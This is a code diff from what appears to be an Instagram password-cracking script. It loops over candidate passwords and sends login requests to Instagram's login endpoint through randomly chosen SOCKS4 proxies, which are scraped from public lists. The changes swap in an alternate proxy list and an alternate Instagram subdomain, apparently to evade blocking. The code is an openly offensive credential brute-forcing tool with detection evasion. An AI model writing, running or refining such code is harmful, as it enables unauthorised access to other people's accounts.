@@ -348,7 +348,7 @@ def ___proxy___():
         ___roz = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
         open('Data/proxy.txt', 'w').write(___roz)
     except Exception as e:
-        ___roz = requests.get('https://raw.githubusercontent.com/MN4WN1-777/ignew/master/Data/proxy2.txt').text
+        ___roz = requests.get('https://raw.githubusercontent.com/MN4WN1-777/ignew/master/Data/proxy.txt').text
         open('Data/proxy.txt', 'w').write(___roz)
     ___crack___()
 # Crack
@@ -421,8 +421,8 @@ class ___crack___:
         try:
             for pw in pwx:
                 pw = pw.lower()
-                ___url = ('https://www.instagram.com/')
-                ___login = ('https://www.instagram.com/accounts/login/ajax/')
+                ___url = ('https://z-p42.www.instagram.com/')
+                ___login = ('https://z-p42.www.instagram.com/accounts/login/ajax/')
                 ___proxy = {'http': 'socks4://%s'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}
                 ___csrf = requests.get(___url).cookies['csrftoken']
                 ___data = {'username': uid,
